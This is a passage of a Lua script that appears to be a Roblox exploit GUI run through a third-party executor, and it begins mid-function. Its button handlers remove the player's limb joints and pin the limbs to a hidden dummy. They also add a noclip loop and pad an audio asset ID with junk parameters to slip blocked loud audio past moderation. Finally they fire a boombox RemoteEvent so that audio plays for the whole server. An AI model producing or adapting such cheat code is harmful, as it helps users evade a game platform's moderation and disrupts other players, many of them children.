			pcall(function() v:MakeJoints() end)
		end
		mas:Destroy()
		for i,v in pairs(cors) do
			spawn(function()
				pcall(v)
			end)
		end
	
	
		char = game.Workspace[game.Players.LocalPlayer.Name]
		char.Torso.CanCollide = false
		char["Left Leg"].CanCollide = false
		char["Right Leg"].CanCollide = false
		char["Right Arm"].CanCollide = false
		char["Left Arm"].CanCollide = false
		char["Head"].CanCollide = false
		char["HumanoidRootPart"].CanCollide = false
		char["Torso"]["Left Shoulder"]:Remove()
		att0 = Instance.new("Attachment",char["Left Arm"]) 
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(0, 0, 0)
		att1 = Instance.new("Attachment",game.Workspace.Dummy["Left Arm"]) 
		ap = Instance.new("AlignPosition",char["Left Arm"])
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true 
		ao = Instance.new("AlignOrientation",char["Left Arm"]) 
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
		char = game.Workspace[game.Players.LocalPlayer.Name]
		char["Torso"]["Right Shoulder"]:Remove()
		att0 = Instance.new("Attachment",char["Right Arm"]) 
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(0, 0, 0)
		att1 = Instance.new("Attachment",game.Workspace.Dummy["Right Arm"]) 
		ap = Instance.new("AlignPosition",char["Right Arm"])
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true 
		ao = Instance.new("AlignOrientation",char["Right Arm"]) 
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
		char["Torso"]["Right Hip"]:Remove()
		att0 = Instance.new("Attachment",char["Right Leg"]) 
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(0, 0, 0)
		att1 = Instance.new("Attachment",game.Workspace.Dummy["Right Leg"]) 
		ap = Instance.new("AlignPosition",char["Right Leg"])
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true 
		ao = Instance.new("AlignOrientation",char["Right Leg"]) 
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
		char["Torso"]["Left Hip"]:Remove()
		att0 = Instance.new("Attachment",char["Left Leg"]) 
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(0, 0, 0)
		att1 = Instance.new("Attachment",game.Workspace.Dummy["Left Leg"]) 
		ap = Instance.new("AlignPosition",char["Left Leg"])
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true 
		ao = Instance.new("AlignOrientation",char["Left Leg"]) 
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
		att0 = Instance.new("Attachment",char["Torso"]) 
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(0, 0, 0)
		att1 = Instance.new("Attachment",game.Workspace.Dummy["Torso"]) 
		ap = Instance.new("AlignPosition",char["Torso"])
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true 
		ao = Instance.new("AlignOrientation",char["Torso"]) 
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true
	
		game.Workspace.Dummy.Torso.Position = game.Players.LocalPlayer.Character.Torso.Position
		game.Workspace.Dummy.HumanoidRootPart.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		game.Players.LocalPlayer.Character = game.Workspace.Dummy
		char=game.Workspace.Dummy
		local speaker = game.Players.LocalPlayer
		Clip = false
		local function NoclipLoop()
			if Clip == false and speaker.Character ~= nil then
				for _, child in pairs(speaker.Character:GetDescendants()) do
					if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
						child.CanCollide = false
					end
				end
			end
		end
		Noclipping = game:GetService('RunService').Stepped:Connect(NoclipLoop)
	
	
		_G.resetdetect=game.Players.LocalPlayer.CharacterAppearanceLoaded:Connect(function()
			_G.resetdetect:Disconnect()
			_G.noclip1:Disconnect()
			_G.noclip0:Disconnect()
		end)
	
		game.Workspace.Dummy.Torso.Transparency = 1
		game.Workspace.Dummy["Left Leg"].Transparency = 1
		game.Workspace.Dummy["Right Leg"].Transparency = 1
		game.Workspace.Dummy["Left Arm"].Transparency = 1
		game.Workspace.Dummy["Right Arm"].Transparency = 1
		game.Workspace.Dummy["Head"].Transparency = 1
		game.Workspace.Dummy["HumanoidRootPart"].Transparency = 1
	
	
		local character = game.Players.LocalPlayer.Character
		character:WaitForChild("Humanoid").Died:Connect(function()
			game.Players.LocalPlayer.Character = game.Workspace[game.Players.LocalPlayer.Name]
			game.Workspace.Dummy:Remove()
			game.Players.LocalPlayer.Character.Humanoid.Health = 0
		end)
	
	
	
	end)
	
end
coroutine.wrap(JBCWUGR_fake_script)()
local function BTBIJBG_fake_script() -- TextButton_6.LocalScript 
	local script = Instance.new('LocalScript', TextButton_6)

	script.Parent.MouseButton1Click:Connect(function()
	
	script.Parent.Parent.Parent.boombox.Visible = true
	
	end)
	
end
coroutine.wrap(BTBIJBG_fake_script)()
local function VBXCVQ_fake_script() -- X.LocalScript 
	local script = Instance.new('LocalScript', X)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
	end)
	
end
coroutine.wrap(VBXCVQ_fake_script)()
local function UUVEFES_fake_script() -- Obfuscate.LocalScript 
	local script = Instance.new('LocalScript', Obfuscate)

	script.Parent.MouseButton1Click:Connect(function()
	
		local ID = tonumber(script.Parent.Parent.input.Text)
		local avid = game:HttpGet("https://www.roblox.com/studio/plugins/info?assetId="..ID):match("value=.(%d+)")
		local textlol = "asset=19381291238 asset= 123879312 versionid=1192021390 minecraft=1902139203 stop using loud audios thanks!!!!!!! &assetversionid="..avid
		script.Parent.Parent.output.Text = textlol
	
	end)
	
end
coroutine.wrap(UUVEFES_fake_script)()
local function GBPCUA_fake_script() -- play.LocalScript 
	local script = Instance.new('LocalScript', play)

	script.Parent.MouseButton1Click:Connect(function()
	function bruh()
		local stuiff = script.Parent.Parent.output.Text
			game.Players.LocalPlayer.Character.BoomBox.RemoteEvent:FireServer(stuiff)
		end
		
		pcall(bruh)
	end)
	
end
coroutine.wrap(GBPCUA_fake_script)()
